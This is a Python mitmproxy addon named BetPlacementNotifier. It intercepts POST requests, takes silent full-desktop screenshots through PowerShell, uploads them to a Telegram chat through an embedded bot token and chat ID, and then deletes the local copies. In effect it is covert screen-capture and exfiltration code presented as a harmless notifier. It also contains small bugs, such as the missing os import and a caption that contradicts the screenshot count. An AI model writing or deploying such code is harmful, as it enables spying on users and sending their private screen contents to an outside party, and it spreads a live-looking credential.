import logging
import asyncio
import httpx
import subprocess
import datetime
import time

class BetPlacementNotifier:

    # Constants for Telegram Bot (for now, you can keep them as placeholders)
    TELEGRAM_BOT_TOKEN = '2015393664:AAEnOcrdGeFY0k8gR7HGWgKrDJR3PsaUC7k'
    CHAT_ID = '-4548554255'

    SCREENSHOT_COUNT = 3
    SCREENSHOT_DELAY = 1

    def __init__(self):
        self.num = 0

    # This method simulates the flow and triggers the screenshot based on the passed parameter
    async def response(self, flow):
        # Example check for request
        if 'httpbin' in flow.request.host and flow.request.method == "POST":
            await self.generate_screenshot()  # Await the coroutine directly

    async def generate_screenshot(self):

        screenshots = []

        for i in range(self.SCREENSHOT_COUNT):
            # Generate a timestamped filename
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = f"C:\\screenshot_{timestamp}_{i}.png"
            screenshots.append(output_file)

            # PowerShell command to take a screenshot
            powershell_command = f"""
            param (
                [string]$outputFile = "{output_file}"
            )

            Add-Type -AssemblyName System.Windows.Forms
            $width = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width
            $height = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height
            $bmp = New-Object Drawing.Bitmap($width, $height)
            $g = [Drawing.Graphics]::FromImage($bmp)
            $g.CopyFromScreen(0, 0, 0, 0, $bmp.Size)
            $g.Dispose()
            $bmp.Save($outputFile)
            $bmp.Dispose()
            """

            # Run the PowerShell command to take the screenshot
            subprocess.run(["powershell", "-Command", powershell_command])

            logging.info(f"Screenshot saved at: {output_file}")

            # Wait for 1 second before taking the next screenshot
            await asyncio.sleep(self.SCREENSHOT_DELAY)

        # Send the screenshot to Telegram
        await self.send_to_telegram(screenshots, "Here are the 5 screenshots taken in sequence.")

    async def send_to_telegram(self, file_paths, caption):
        # Open the file in binary mode
        await self.send_message(f"\nStart sending screenshots\n")

        for index, file_path in enumerate(file_paths):
            with open(file_path, 'rb') as file:
                url = f"https://api.telegram.org/bot{self.TELEGRAM_BOT_TOKEN}/sendPhoto"
                payload = {
                    'chat_id': self.CHAT_ID,
                }
                files = {
                    'photo': file
                }

                async with httpx.AsyncClient() as client:
                    try:
                        response = await client.post(url, data=payload, files=files)

                        logging.info(f"Response from Telegram: {response.json()}")

                        if response.status_code == 200:
                            logging.info(f"Screenshots sent to Telegram successfully.")

                    except Exception as e:
                        logging.error(f"Error sending screenshot: {e}")

        await self.remove_files(file_paths)

    async def send_message(self, message):
        # URL for sending a message via Telegram bot
        url = f"https://api.telegram.org/bot{self.TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': self.CHAT_ID,
            'text': message
        }

        async with httpx.AsyncClient() as client:
            try:
                response = await client.post(url, data=payload)

                if response.status_code == 200:
                    logging.info(f"Initial message sent to Telegram successfully.")
                else:
                    logging.error(f"Failed to send initial message. Status code: {response.status_code}")

            except Exception as e:
                logging.error(f"Error sending initial message: {e}")

    async def remove_files(self, file_paths):
       for file_path in file_paths:
        try:
            if os.path.exists(file_path):
                os.remove(file_path)
        except Exception as e:
            logging.error(f"Error removing file {file_path}: {e}")



addons = [BetPlacementNotifier()]
